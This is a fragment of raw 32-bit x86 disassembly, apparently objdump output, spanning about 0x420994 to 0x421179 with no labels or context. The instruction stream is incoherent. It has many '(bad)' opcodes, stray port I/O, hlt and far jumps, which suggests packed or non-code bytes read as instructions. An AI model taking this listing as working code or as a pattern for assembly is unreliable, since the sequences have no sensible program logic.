  420994:	sbb    bl,BYTE PTR [eax]
  420996:	mov    DWORD PTR [eax+esi*2-0x73fffe52],ecx
  42099d:	push   ebp
  42099e:	mov    DWORD PTR [eax+eax*4+0x5cfffce2],ecx
  4209a5:	dec    edi
  4209a6:	in     al,0xc4
  4209a8:	sbb    al,0xff
  4209aa:	dec    DWORD PTR [edx+0x74ef3a1c]
  4209b0:	pop    edx
  4209b1:	mov    edx,ebx
  4209b3:	mov    edx,DWORD PTR [ebx]
  4209b5:	out    0xb0,eax
  4209b7:	hlt    
  4209b8:	add    BYTE PTR [eax],al
  4209ba:	add    BYTE PTR [eax],al
  4209bc:	add    BYTE PTR [ebx],bl
  4209be:	(bad)  
  4209bf:	in     al,0x4e
  4209c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4209c2:	(bad)  
  4209c5:	jne    0x4209ae
  4209c7:	out    0x73,eax
  4209c9:	ja     0x420a23
  4209cb:	test   BYTE PTR [eax-0x7fbf7edd],bl
  4209d1:	cdq    
  4209d2:	aas    
  4209d3:	mov    esp,0x43d683ff
  4209d8:	xor    DWORD PTR ds:0x3ee8459,0xffffffa1
  4209df:	inc    eax
  4209e0:	cld    
  4209e1:	cmp    edi,0xc3d2890f
  4209e7:	or     eax,0xd8c8eaed
  4209ec:	out    0xa5,eax
  4209ee:	rol    BYTE PTR [eax-0x4],1
  4209f1:	int3   
  4209f2:	outs   dx,BYTE PTR ds:[esi]
  4209f3:	ds cld 
  4209f5:	rcr    BYTE PTR [esi-0x3cdadc49],cl
  4209fb:	pop    ebp
  4209fc:	pop    esi
  4209fd:	ret    0x8ce0
  420a00:	xor    ah,BYTE PTR [ecx+0x3d]
  420a03:	sar    bh,0x1
  420a06:	test   al,0xe7
  420a08:	xchg   edi,eax
  420a09:	je     0x420a36
  420a0b:	add    BYTE PTR [eax-0x5e],dl
  420a0e:	sbb    DWORD PTR [ecx-0x4d],eax
  420a11:	push   ecx
  420a12:	out    dx,eax
  420a13:	add    al,BYTE PTR [eax]
  420a15:	jne    0x4209ff
  420a17:	xchg   DWORD PTR [ebx],esp
  420a19:	shr    DWORD PTR [edx],0x0
  420a1c:	add    cl,ah
  420a1e:	mov    ds:0xffc3,eax
  420a23:	add    BYTE PTR [eax],al
  420a25:	add    BYTE PTR [edx+0x72ff9bf0],dl
  420a2b:	sahf   
  420a2c:	test   BYTE PTR [ebx],ah
  420a2e:	jne    0x420a5a
  420a30:	add    BYTE PTR [eax],al
  420a32:	lds    eax,FWORD PTR [eax+0x56]
  420a35:	mov    BYTE PTR [eax+0x7540151f],bl
  420a3b:	xor    bl,ah
  420a3d:	and    edi,DWORD PTR [ecx-0x3602f611]
  420a43:	add    cl,bl
  420a45:	iret   
  420a46:	cmp    DWORD PTR [ecx-0x21],edx
  420a49:	fist   WORD PTR [esi-0x36]
  420a4c:	sbb    cl,BYTE PTR [edx]
  420a4e:	sub    BYTE PTR [esi+0x5121cbc2],ch
  420a54:	jae    0x420a1d
  420a56:	push   esi
  420a57:	adc    cl,BYTE PTR [edi-0x18fe3894]
  420a5d:	nop
  420a5e:	mov    dh,0xde
  420a60:	into   
  420a61:	rol    DWORD PTR [ecx],cl
  420a63:	push   eax
  420a64:	jae    0x4209ed
  420a66:	push   esi
  420a67:	push   0xffffffe6
  420a69:	add    esi,DWORD PTR [ebp+0x2a]
  420a6c:	xchg   ebp,eax
  420a6d:	ret    0x38e9
  420a70:	pop    ebx
  420a71:	(bad)  
  420a72:	xchg   esi,eax
  420a73:	ror    BYTE PTR [esi+0x3f],cl
  420a76:	cmp    DWORD PTR [ecx],edi
  420a78:	cmp    eax,0x61dd30e2
  420a7d:	sub    BYTE PTR [edi],ch
  420a7f:	inc    ebp
  420a80:	xchg   ebx,eax
  420a81:	mov    cs,esi
  420a83:	sar    BYTE PTR [ecx-0x11514626],cl
  420a89:	test   BYTE PTR [eax],0x0
  420a8c:	add    BYTE PTR [eax],al
  420a8e:	add    ch,cl
  420a90:	aam    0x7e
  420a92:	mov    ebp,0x8be70276
  420a97:	aas    
  420a98:	cmp    DWORD PTR ds:0xa7133518,eax
  420a9e:	add    edi,esp
  420aa0:	cmp    DWORD PTR [ecx-0x6b5df9c2],esi
  420aa6:	(bad)  
  420aa7:	sub    DWORD PTR [esi+0x35f2bf2],0x32fc03e8
  420ab1:	adc    DWORD PTR ds:0x701cae6,esi
  420ab7:	test   eax,0xc4042958
  420abc:	rcr    DWORD PTR [ecx],cl
  420abe:	pop    es
  420abf:	mov    bh,0x32
  420ac1:	jmp    FWORD PTR [edx]
  420ac3:	jno    0x420a97
  420ac5:	push   eax
  420ac6:	sbb    bl,BYTE PTR [edi+esi*1]
  420ac9:	adc    ah,ch
  420acb:	addr16 ret 0x6fff
  420acf:	cmp    al,BYTE PTR [eax]
  420ad1:	cmp    DWORD PTR [edx-0x697e513],ebp
  420ad7:	or     eax,0xb419fc38
  420adc:	adc    al,0x1c
  420ade:	fidiv  DWORD PTR [esi]
  420ae0:	cmp    ch,bh
  420ae2:	cld    
  420ae3:	jle    0x420b1a
  420ae5:	adc    ah,ch
  420ae7:	imul   eax,edx,0x37322eff
  420aed:	(bad)  
  420aee:	push   ecx
  420aef:	xchg   DWORD PTR [edx+0x68ff],ebp
  420af5:	add    BYTE PTR [eax],al
  420af7:	add    BYTE PTR [ecx+0x2],dh
  420afa:	push   ecx
  420afb:	mov    bh,0xbd
  420afd:	ss adc al,cl
  420b00:	add    dl,0xff
  420b03:	xchg   ebp,eax
  420b04:	xor    eax,0xb6da0414
  420b09:	aaa    
  420b0a:	pop    edx
  420b0b:	arpl   WORD PTR [edx+0x2fc25c36],di
  420b11:	inc    ecx
  420b12:	pop    es
  420b13:	jmp    0x692d95e3
  420b18:	mov    DWORD PTR gs:[ecx],0x88d176e9
  420b1f:	in     al,0x72
  420b21:	adc    DWORD PTR [eax-0x17],eax
  420b24:	lods   al,BYTE PTR ds:[esi]
  420b25:	into   
  420b26:	xor    dh,dh
  420b28:	cmp    al,0xc4
  420b2a:	cld    
  420b2b:	jmp    0x7135c81f
  420b30:	mov    ebx,0x7b53542f
  420b35:	xor    eax,0xc2862512
  420b3a:	call   FWORD PTR [edi+0x3b]
  420b3d:	daa    
  420b3e:	xchg   BYTE PTR [eax],al
  420b40:	mov    cl,0xf2
  420b42:	jg     0x420b3c
  420b44:	adc    edx,DWORD PTR [edx]
  420b46:	test   BYTE PTR [ebx*2-0x2672fffd],dh
  420b4d:	mov    bl,0xf9
  420b4f:	call   DWORD PTR [ebx]
  420b51:	push   ebx
  420b52:	sti    
  420b53:	jne    0x420b61
  420b55:	retf   0xb081
  420b58:	add    edx,eax
  420b5a:	sti    
  420b5b:	sub    al,0x0
  420b5d:	add    BYTE PTR [eax],al
  420b5f:	add    BYTE PTR [eax],al
  420b61:	push   cs
  420b62:	add    eax,DWORD PTR [eax]
  420b64:	(bad)  
  420b65:	cmp    DWORD PTR [edi],edi
  420b67:	or     eax,0xfbec1c40
  420b6c:	add    BYTE PTR [ebx+eax*1],bl
  420b6f:	xchg   DWORD PTR [ebp-0x407bc],ecx
  420b75:	push   edi
  420b76:	ror    DWORD PTR [ebx],1
  420b78:	xchg   BYTE PTR ds:0x87000003,bh
  420b7e:	pop    es
  420b7f:	xchg   esp,eax
  420b80:	loop   0x420b91
  420b82:	add    ecx,DWORD PTR [ebx]
  420b84:	test   BYTE PTR [ecx+0x3],bh
  420b87:	add    BYTE PTR [eax],al
  420b89:	iret   
  420b8a:	ret    0x7d35
  420b8d:	test   BYTE PTR [ecx+0xe],bh
  420b90:	mov    ebp,ecx
  420b92:	out    dx,al
  420b93:	xor    eax,0x84124e0c
  420b98:	ret    0x29c
  420b9b:	add    BYTE PTR [eax-0x39],al
  420b9e:	aas    
  420b9f:	hlt    
  420ba0:	jb     0x420b44
  420ba2:	push   eax
  420ba3:	in     al,0x15
  420ba5:	jae    0x420baa
  420ba7:	add    BYTE PTR [ecx-0x38c81527],cl
  420bad:	xchg   ebx,eax
  420bae:	jle    0x420b57
  420bb0:	add    BYTE PTR [edx+eax*1-0x3f2b4a05],cl
  420bb7:	sti    
  420bb8:	jmp    FWORD PTR [ebx+0x7503fc66]
  420bbe:	sub    eax,DWORD PTR [eax]
  420bc0:	std    
  420bc1:	mov    bl,ch
  420bc3:	adc    al,BYTE PTR [eax+0x0]
  420bc6:	add    BYTE PTR [eax],al
  420bc8:	add    BYTE PTR [eax],al
  420bca:	jne    0x420b7c
  420bcc:	xor    edi,DWORD PTR [eax]
  420bce:	dec    edx
  420bcf:	and    eax,0x2b758984
  420bd4:	add    BYTE PTR [ebx+0x55d33fb8],cl
  420bda:	dec    ebp
  420bdb:	adc    cl,ch
  420bdd:	push   DWORD PTR [edx]
  420bdf:	out    dx,al
  420be0:	mov    bh,dh
  420be2:	sub    bh,BYTE PTR [ecx-0x7a]
  420be5:	cld    
  420be6:	test   eax,0x1142890e
  420beb:	inc    ecx
  420bec:	pop    es
  420bed:	xor    BYTE PTR [ebx],dh
  420bef:	jmp    0xacd37ef7
  420bf4:	hlt    
  420bf5:	cld    
  420bf6:	push   0x754013df
  420bfb:	loopne 0x420c03
  420bfd:	sub    bl,dl
  420bff:	push   0xa0417300
  420c04:	or     al,0x50
  420c06:	adc    al,0x0
  420c08:	pop    esi
  420c09:	inc    eax
  420c0a:	jne    0x420bbc
  420c0c:	add    ebp,eax
  420c0e:	inc    eax
  420c0f:	int3   
  420c10:	add    eax,DWORD PTR [eax]
  420c12:	lock jmp 0x420bcb
  420c15:	ds out dx,al
  420c17:	xchg   esi,eax
  420c18:	cmp    BYTE PTR [edx+0x7ae69],cl
  420c1e:	jne    0x420c4b
  420c20:	(bad)  
  420c21:	jb     0x420bc4
  420c23:	add    esi,DWORD PTR [edx+edx*4+0x75]
  420c27:	sub    eax,DWORD PTR [edi+edi*4+0x52895021]
  420c2e:	add    BYTE PTR [eax],al
  420c30:	add    BYTE PTR [eax],al
  420c32:	add    BYTE PTR [ebp-0x77487950],cl
  420c38:	sub    al,0x3d
  420c3a:	mov    BYTE PTR [eax],dh
  420c3c:	das    
  420c3d:	cmp    eax,0xe6028d72
  420c42:	enter  0x356a,0x23
  420c46:	xor    bl,dh
  420c48:	std    
  420c49:	ja     0x420c89
  420c4b:	daa    
  420c4c:	jp     0x420c19
  420c4e:	ds pop ecx
  420c50:	sub    ch,BYTE PTR [esi]
  420c52:	ds push ecx
  420c54:	xor    eax,0xfec64362
  420c59:	lods   al,BYTE PTR ds:[esi]
  420c5a:	enter  0x341,0x16
  420c5e:	sub    al,0x7f
  420c60:	mov    esi,fs
  420c62:	add    esp,DWORD PTR [ebp+esi*1-0x63]
  420c66:	mov    eax,0x90b93512
  420c6b:	div    DWORD PTR [ecx-0x75]
  420c6e:	ds sbb edx,edx
  420c71:	test   DWORD PTR [eax-0x342ccade],edi
  420c77:	jnp    0x420c3b
  420c79:	out    0x88,al
  420c7b:	ret    0x6404
  420c7e:	cmp    al,0xf8
  420c80:	xor    al,0x65
  420c82:	xor    bl,BYTE PTR ds:[di+0x52]
  420c87:	mov    ds:0xf60e42b7,eax
  420c8c:	ins    DWORD PTR es:[edi],dx
  420c8d:	dec    esp
  420c8e:	fnstenv ds:[ebx+edi*4]
  420c92:	aaa    
  420c93:	fimul  DWORD PTR [ecx]
  420c95:	push   ebp
  420c96:	add    eax,DWORD PTR [eax]
  420c98:	add    BYTE PTR [eax],al
  420c9a:	add    BYTE PTR [eax],al
  420c9c:	jne    0x420c26
  420c9e:	stos   DWORD PTR es:[edi],eax
  420c9f:	ds and esp,edx
  420ca2:	xchg   ecx,eax
  420ca3:	dec    esp
  420ca4:	mov    ch,0x7e
  420ca6:	sbb    al,0xb7
  420ca8:	xchg   ebx,eax
  420ca9:	mov    ebx,ebp
  420cab:	imul   edi,DWORD PTR [esi-0x1d0d1940],0x7e
  420cb2:	pop    ds
  420cb3:	mov    bh,0x87
  420cb5:	mov    ebx,ebx
  420cb7:	addr16 mov esi,0x44fce6c0
  420cbd:	scas   al,BYTE PTR es:[edi]
  420cbe:	jmp    esi
  420cc0:	mov    dh,0xb3
  420cc2:	shl    DWORD PTR [ecx+0x76],0x2
  420cc6:	add    BYTE PTR [edx],ah
  420cc8:	mov    dh,0xb1
  420cca:	out    dx,al
  420ccb:	push   0xffffffb9
  420ccd:	shl    BYTE PTR ss:[edx+0x72],0x6a
  420cd2:	retf   
  420cd3:	sub    dh,BYTE PTR [ecx-0x2f]
  420cd6:	push   edx
  420cd7:	pop    ds
  420cd8:	hlt    
  420cd9:	dec    eax
  420cda:	cld    
  420cdb:	cli    
  420cdc:	mov    dh,0xce
  420cde:	mov    eax,0x27961
  420ce3:	fs scas al,BYTE PTR es:[edi]
  420ce5:	scas   eax,DWORD PTR es:[edi]
  420ce6:	and    esi,DWORD PTR [edx+0x2a]
  420ce9:	pusha  
  420cea:	retf   
  420ceb:	sub    dh,BYTE PTR [ecx-0x77]
  420cee:	aad    0x6a
  420cf0:	pop    ds
  420cf1:	xor    al,0x70
  420cf3:	loopne 0x420d2b
  420cf5:	add    edx,ecx
  420cf7:	ret    0xb1b7
  420cfa:	repz xchg edx,eax
  420cfc:	jnp    0x420c87
  420cfe:	test   DWORD PTR [eax],0x0
  420d04:	add    BYTE PTR [eax+0x7b],al
  420d07:	(bad)  
  420d08:	call   0x73400e83
  420d0d:	mov    eax,ds:0x1fa82eb0
  420d12:	cmp    eax,0x276e987
  420d17:	mov    esi,0xffc24585
  420d1c:	push   eax
  420d1d:	inc    ecx
  420d1e:	(bad)  
  420d1f:	(bad)  
  420d20:	call   0xabb58117
  420d25:	in     eax,dx
  420d26:	call   0x33f62ad2
  420d2b:	std    
  420d2c:	in     al,dx
  420d2d:	push   ds
  420d2e:	inc    edi
  420d2f:	inc    eax
  420d30:	jmp    0x16a84632
  420d35:	icebp  
  420d36:	xor    edi,esp
  420d38:	jmp    0xe604b2
  420d3d:	dec    eax
  420d3e:	inc    ecx
  420d3f:	cld    
  420d40:	jae    0x420cf4
  420d42:	push   edx
  420d43:	push   ebx
  420d44:	call   0x3e9b2d
  420d49:	pop    ss
  420d4a:	dec    edx
  420d4b:	and    BYTE PTR [edi+ecx*4],dl
  420d4e:	fnstcw WORD PTR [edi]
  420d50:	push   0x5c
  420d52:	test   BYTE PTR [ebx+0x18],dh
  420d55:	aad    0xfe
  420d57:	test   BYTE PTR [edi+0x50],bl
  420d5a:	out    0x39,eax
  420d5c:	mov    esp,0x8d4ff63b
  420d61:	xor    DWORD PTR [esi],0xffffffe4
  420d64:	xor    al,0xc8
  420d66:	idiv   bl
  420d68:	pop    edi
  420d69:	add    BYTE PTR [eax],al
  420d6b:	add    BYTE PTR [eax],al
  420d6d:	add    BYTE PTR [edx-0x77],ch
  420d70:	rcr    DWORD PTR [ebp-0x49],0xc0
  420d74:	add    BYTE PTR [eax],al
  420d76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d77:	dec    edx
  420d78:	or     al,0x56
  420d7a:	arpl   WORD PTR [ecx],si
  420d7c:	sti    
  420d7d:	xor    ecx,esp
  420d7f:	jnp    0x420d46
  420d81:	je     0x420d9c
  420d83:	mov    ch,BYTE PTR [edi+0xc]
  420d86:	xchg   ebp,ecx
  420d88:	repnz add cl,BYTE PTR [esi]
  420d8b:	ins    BYTE PTR es:[edi],dx
  420d8c:	push   es
  420d8d:	inc    eax
  420d8e:	pop    ecx
  420d90:	sub    al,0x3b
  420d92:	popf   
  420d93:	jno    0x420d84
  420d95:	jmp    0x420d7c
  420d97:	imul   edi,DWORD PTR [eax+esi*1-0x7784331],0x6b3d20c1
  420da2:	test   DWORD PTR [edi],ebp
  420da4:	mov    DWORD PTR [ebx-0x28],esi
  420da7:	out    0x3f,al
  420da9:	xchg   esp,eax
  420daa:	int3   
  420dab:	inc    BYTE PTR [ebx-0x78e5ff40]
  420db1:	inc    ebx
  420db2:	lods   al,BYTE PTR ds:[esi]
  420db3:	mov    esp,esi
  420db5:	imul   ecx,DWORD PTR [ebx+0x753dff2f],0xffffff9e
  420dbc:	sar    dh,0xed
  420dbf:	adc    BYTE PTR [si+0x7c],dh
  420dc3:	mov    al,0xbf
  420dc5:	pop    es
  420dc6:	cld    
  420dc7:	pop    ebx
  420dc8:	add    al,0xc6
  420dca:	jp     0x420df3
  420dcc:	xchg   esp,eax
  420dce:	sbb    al,BYTE PTR [ebx+0x553f]
  420dd4:	add    BYTE PTR [eax],al
  420dd6:	add    dh,bh
  420dd8:	retf   0x3113
  420ddb:	xor    eax,0xe9f57ef9
  420de0:	xor    eax,0xa471768d
  420de5:	retf   0xfe0b
  420de8:	mov    bh,dl
  420dea:	jns    0x420e5d
  420dec:	idiv   dh
  420dee:	cmc    
  420def:	ja     0x420e0e
  420df1:	lods   al,BYTE PTR ds:[esi]
  420df2:	or     dh,BYTE PTR [ebp+0x6e2f459c]
  420df8:	popa   
  420df9:	mov    ch,0xed
  420dfb:	pop    bx
  420dfd:	fcomp  DWORD PTR [ebp+0x36]
  420e00:	add    eax,0x5a762f44
  420e05:	sub    al,0xf5
  420e07:	jmp    DWORD PTR [ecx]
  420e09:	push   0x6bf28001
  420e0e:	inc    BYTE PTR [esi+0x6d458d28]
  420e14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e15:	inc    ebx
  420e16:	jae    0x420dbe
  420e18:	imul   ebp,DWORD PTR [eax],0xffffff90
  420e1b:	ficomp WORD PTR [ebx]
  420e1d:	add    cl,ch
  420e1f:	mov    ds,eax
  420e21:	mov    cl,0xb
  420e23:	out    dx,al
  420e24:	imul   edx,DWORD PTR [eax],0x396f6de8
  420e2a:	cld    
  420e2b:	retf   0x879
  420e2e:	call   0x45de2c
  420e33:	mov    edx,0x31e80c79
  420e38:	add    bh,BYTE PTR [ebx+0x4]
  420e3b:	add    BYTE PTR [eax],al
  420e3d:	add    BYTE PTR [eax],al
  420e3f:	add    BYTE PTR [ebp+0x31],dh
  420e42:	xchg   esp,eax
  420e43:	jecxz  0x420ddf
  420e45:	mov    dh,0x7a
  420e47:	add    al,0x75
  420e49:	xor    DWORD PTR [ebx+ebp*8+0x45a9e9a],edx
  420e50:	jne    0x420dee
  420e52:	mov    dh,0xd1
  420e54:	call   0xe448:0x75045bcb
  420e5b:	add    eax,0xd23bd534
  420e60:	sar    DWORD PTR [ebp-0x22],0xac
  420e64:	popa   
  420e65:	jp     0x420e4d
  420e67:	add    esi,DWORD PTR [ebp+0x5]
  420e6a:	or     al,0x60
  420e6c:	(bad)
  420e70:	pop    edi
  420e71:	xor    DWORD PTR ds:0xbee0fbdc,esi
  420e77:	(bad)
  420e7a:	out    0x3a,eax
  420e7c:	test   eax,0x6fd8eb2
  420e81:	add    ah,bh
  420e83:	cmp    ch,cl
  420e85:	and    esi,0xbd1a7503
  420e8b:	(bad)  
  420e8c:	adc    dh,BYTE PTR [ecx]
  420e8e:	mov    ecx,0xd6a1435e
  420e93:	mov    cl,0x65
  420e95:	jge    0x420e94
  420e97:	pop    es
  420e98:	je     0x420ed1
  420e9a:	jle    0x420e45
  420e9c:	icebp  
  420e9d:	xor    BYTE PTR [ebp-0x3a],ah
  420ea0:	cmc    
  420ea1:	inc    esi
  420ea2:	push   ss
  420ea3:	inc    DWORD PTR [eax]
  420ea5:	add    BYTE PTR [eax],al
  420ea7:	add    BYTE PTR [eax],al
  420ea9:	inc    ecx
  420eaa:	adc    bl,cl
  420eac:	sub    cl,bl
  420eae:	mov    eax,0x967f2bda
  420eb3:	out    0x3,al
  420eb5:	jmp    0xff7b:0xc2c62a59
  420ebc:	xor    ch,dh
  420ebe:	jo     0x420f33
  420ec0:	cwde   
  420ec1:	add    edx,DWORD PTR [esp+eiz*4]
  420ec4:	xor    eax,0x318930b3
  420ec9:	rol    DWORD PTR [edi-0x79],1
  420ecc:	jmp    0x5dcd1147
  420ed1:	imul   ebp,DWORD PTR [edx-0x7db0f904],0x7c5e936
  420edb:	jg     0x420edd
  420edd:	out    dx,al
  420ede:	xor    ah,bh
  420ee0:	jmp    0x2333c424
  420ee5:	test   eax,0x9c6429b3
  420eea:	mov    ah,0xd
  420eec:	cmp    ecx,DWORD PTR [ecx+0x76e99040]
  420ef2:	(bad)  
  420ef4:	lea    edi,[ebp+0x6bd1ffc2]
  420efa:	jns    0x420ec8
  420efc:	inc    eax
  420efd:	scas   al,BYTE PTR es:[edi]
  420efe:	xchg   edi,edi
  420f00:	call   0xb5e57f7b
  420f05:	xor    BYTE PTR [eax],dh
  420f07:	in     al,0x94
  420f09:	or     esi,DWORD PTR [eax]
  420f0b:	cld    
  420f0c:	pusha  
  420f0d:	add    BYTE PTR [eax],al
  420f0f:	add    BYTE PTR [eax],al
  420f11:	add    BYTE PTR [edx],ah
  420f13:	push   0xcd792acb
  420f18:	pop    ebp
  420f19:	and    al,0x28
  420f1b:	inc    ebx
  420f1c:	push   edx
  420f1d:	jb     0x420f6c
  420f1f:	mov    al,0xeb
  420f21:	inc    ebp
  420f22:	imul   eax,DWORD PTR [edx],0xf9231700
  420f28:	mov    bl,BYTE PTR [ebp+eiz*1-0x3ea103d1]
  420f2f:	daa    
  420f30:	loope  0x420f22
  420f32:	jbe    0x420f36
  420f34:	mov    esp,DWORD PTR [ebp+edx*1+0x2b]
  420f38:	cld    
  420f39:	add    BYTE PTR [ebx],dh
  420f3b:	push   esi
  420f3c:	data16 add BYTE PTR [edi+ecx*2],ah
  420f40:	sar    bh,1
  420f42:	add    DWORD PTR [edx+0x3f180fbc],0xfffffffd
  420f49:	call   FWORD PTR [esi+edi*2-0x50eeaf3e]
  420f50:	pusha  
  420f51:	sti    
  420f52:	sub    ecx,0x4c
  420f55:	push   eax
  420f56:	je     0x420f8b
  420f58:	sar    edi,1
  420f5a:	jae    0x420f0b
  420f5c:	mov    esp,0xfd37180f
  420f61:	dec    DWORD PTR [ebp+ebx*2+0x7fe98d37]
  420f68:	push   esp
  420f69:	call   0x421b73
  420f6e:	out    0xc1,eax
  420f70:	dec    esp
  420f71:	(bad)  
  420f72:	leave  
  420f73:	(bad)  
  420f74:	idiv   edi
  420f76:	add    BYTE PTR [eax],al
  420f78:	add    BYTE PTR [eax],al
  420f7a:	add    BYTE PTR [ebx+0x53],al
  420f7d:	mov    DWORD PTR [ebp-0x41470],eax
  420f83:	pop    esp
  420f84:	fiadd  WORD PTR [edx*8-0x3f7e15fd]
  420f8b:	push   ebx
  420f8c:	scas   eax,DWORD PTR es:[edi]
  420f8d:	adc    BYTE PTR [ecx],al
  420f8f:	sbb    al,0x3
  420f91:	mov    DWORD PTR [ebp-0x414a0],eax
  420f97:	pop    esp
  420f98:	jmp    0x435057ae
  420f9d:	cld    
  420f9e:	xor    ah,0xe9
  420fa1:	or     eax,DWORD PTR [edx+eax*4+0x76000003]
  420fa8:	sub    cl,BYTE PTR [ecx-0x1bb4eb8b]
  420fae:	push   0x75
  420fb0:	push   es
  420fb1:	add    BYTE PTR [edx-0x7f],ch
  420fb4:	xchg   DWORD PTR [ecx-0x50],esi
  420fb7:	jne    0x42102a
  420fb9:	sub    BYTE PTR [esp+ebp*2+0x19],bl
  420fbd:	add    BYTE PTR [edx-0x75],ch
  420fc0:	mov    dh,0xad
  420fc2:	out    dx,eax
  420fc3:	sbb    eax,0x7516ccd1
  420fc8:	sbb    ebx,edx
  420fca:	lds    edi,FWORD PTR [eax]
  420fcc:	loopne 0x420fce
  420fce:	push   ebp
  420fcf:	jp     0x420fa0
  420fd1:	mov    ebp,0xbd9e45fc
  420fd6:	mov    DWORD PTR [ebp-0x7d],0x7e00590a
  420fdd:	push   esp
  420fde:	out    0x0,eax
  420fe0:	add    BYTE PTR [eax],al
  420fe2:	add    BYTE PTR [eax],al
  420fe4:	pop    esi
  420fe5:	fwait
  420fe6:	add    BYTE PTR [eax],al
  420fe8:	sbb    al,0x62
  420fea:	xor    edi,0x74
  420fed:	sub    BYTE PTR [ebp+esi*4-0x74ffe48b],al
  420ff4:	lock (bad) 
  420ff6:	cmp    bh,ah
  420ff8:	(bad)  
  420ff9:	in     al,dx
  420ffa:	test   eax,0x73dee8fc
  420fff:	dec    edi
  421000:	(bad)  
  421001:	fs sar esp,cl
  421004:	pusha  
  421005:	movlps QWORD PTR [eax+0x75],xmm0
  421009:	mov    al,0x3b
  42100b:	cmp    BYTE PTR [edx],0x75
  42100e:	add    al,0x84
  421010:	or     BYTE PTR [eax+eax*1],bl
  421013:	add    al,bh
  421015:	sahf   
  421016:	xlat   BYTE PTR ds:[ebx]
  421017:	mul    BYTE PTR [edx]
  421019:	(bad)  
  42101a:	shl    DWORD PTR [edi+0x71],cl
  42101d:	sbb    al,BYTE PTR [eax]
  42101f:	add    BYTE PTR [eax],al
  421021:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421022:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421023:	cli    
  421024:	or     al,BYTE PTR [ebp+0x160b30d3]
  42102a:	xchg   DWORD PTR [edx+0x5],eax
  42102d:	or     al,0x87
  42102f:	inc    edx
  421030:	ror    DWORD PTR [ebx],1
  421032:	xor    eax,0xf8024512
  421037:	ret    
  421038:	loop   0x420fc0
  42103a:	es mov al,0x3a
  42103d:	jg     0x4210aa
  42103f:	test   al,0xcf
  421041:	sub    eax,0x77839e4d
  421046:	sar    BYTE PTR [eax],cl
  421048:	add    BYTE PTR [eax],al
  42104a:	add    BYTE PTR [eax],al
  42104c:	add    cl,al
  42104e:	sub    eax,0x81530fb2
  421053:	out    dx,al
  421054:	out    0x27,al
  421056:	add    al,0xc1
  421058:	xlat   BYTE PTR ds:[ebx]
  421059:	inc    ebx
  42105a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42105b:	outs   dx,DWORD PTR ds:[esi]
  42105c:	or     al,0xf4
  42105e:	inc    edx
  42105f:	call   0x9c347401
  421064:	daa    
  421065:	cmc    
  421066:	sub    eax,0x7f50b0e7
  42106b:	imul   ebp,DWORD PTR [eax-0x2c02d281],0xffffffef
  421072:	xchg   DWORD PTR [edx-0x69d28ec6],ecx
  421078:	mov    bh,dh
  42107a:	aad    0xdd
  42107c:	ss popa 
  42107e:	ror    dh,cl
  421080:	sbb    al,0x41
  421082:	sub    eax,0xb61280d5
  421087:	lock mov bh,bh
  42108a:	aad    0xbd
  42108c:	ss inc ecx
  42108e:	sbb    esp,esp
  421090:	mov    bh,ch
  421092:	popf   
  421093:	mov    bl,0x36
  421095:	xor    DWORD PTR [ecx+0x13],edi
  421098:	or     al,0x1d
  42109a:	or     ah,bh
  42109c:	add    esi,DWORD PTR [ebp-0x7a]
  42109f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4210a0:	scas   eax,DWORD PTR es:[edi]
  4210a1:	outs   dx,DWORD PTR ds:[esi]
  4210a2:	sub    al,0x2b
  4210a4:	aaa    
  4210a5:	xchg   edx,eax
  4210a6:	scas   eax,DWORD PTR es:[edi]
  4210a7:	lea    edi,[ecx]
  4210a9:	jns    0x42102b
  4210ab:	shl    DWORD PTR [esi],1
  4210ad:	add    DWORD PTR ds:0xdb1d,ebp
  4210b3:	add    BYTE PTR [eax],al
  4210b5:	add    BYTE PTR [eax-0xd5500c5],bl
  4210bb:	sub    al,0x53
  4210bd:	bound  edx,QWORD PTR [edx+0x77d5ebac]
  4210c3:	add    al,BYTE PTR [eax]
  4210c5:	mov    bh,0xab
  4210c7:	call   0x6057:0x21056439
  4210ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4210cf:	xor    BYTE PTR [eax+0x17d68e40],cl
  4210d5:	jmp    0x9a078c50
  4210da:	ret    
  4210db:	ja     0x42105f
  4210dd:	push   ebp
  4210de:	bound  ebp,QWORD PTR [esi]
  4210e0:	cld    
  4210e1:	mov    ecx,0x1ed0694e
  4210e6:	arpl   WORD PTR [eax+0x7112e6bf],ax
  4210ec:	(bad)  
  4210ed:	call   0xa0380468
  4210f2:	into   
  4210f3:	lods   al,BYTE PTR ds:[esi]
  4210f4:	(bad)  
  4210f5:	call   0x9f43a970
  4210fa:	sbb    al,0x2d
  4210fc:	fs jmp 0x74821378
  421102:	loop   0x421093
  421104:	sti    
  421105:	fisub  WORD PTR [eax+0x36fcfcbb]
  42110b:	adc    al,BYTE PTR [eax-0x17]
  42110e:	inc    eax
  421110:	sti    
  421111:	push   0xffffff81
  421113:	cs or  al,0x65
  421116:	out    dx,al
  421117:	sub    edi,esp
  421119:	jmp    0x42111e
  42111e:	add    BYTE PTR [ebp-0x66],al
  421121:	cmp    al,0x5c
  421123:	mov    ds:0x68a6fd87,al
  421128:	shl    DWORD PTR [ecx],cl
  42112a:	ret    0x3849
  42112d:	adc    al,0xe9
  42112f:	jbe    0x421105
  421131:	mov    ah,dl
  421133:	xor    dl,BYTE PTR [edx]
  421135:	inc    eax
  421136:	add    BYTE PTR [eax*4-0x4aa307bf],cl
  42113d:	inc    edx
  42113e:	add    esp,ebx
  421140:	call   DWORD PTR [edx-0x73]
  421143:	push   ecx
  421144:	mov    bh,dl
  421146:	call   FWORD PTR [ebx+0x56]
  421149:	sti    
  42114a:	jne    0x421184
  42114c:	cmc    
  42114d:	rol    BYTE PTR [ebp+0x3930729c],cl
  421153:	mov    ecx,0x4f2f71e7
  421158:	jae    0x42114a
  42115a:	add    BYTE PTR [eax],al
  42115c:	and    edi,ebx
  42115e:	jne    0x4211d0
  421160:	cmc    
  421161:	adc    esp,eax
  421163:	into   
  421164:	aas    
  421165:	cld    
  421166:	imul   ecx,DWORD PTR [edx+edi*2-0x182e720c],0x5b6b574c
  421171:	lock jmp ecx
  421174:	repz sti 
  421176:	(bad)  
  421177:	adc    esi,eax
  421179:	jo     0x421184
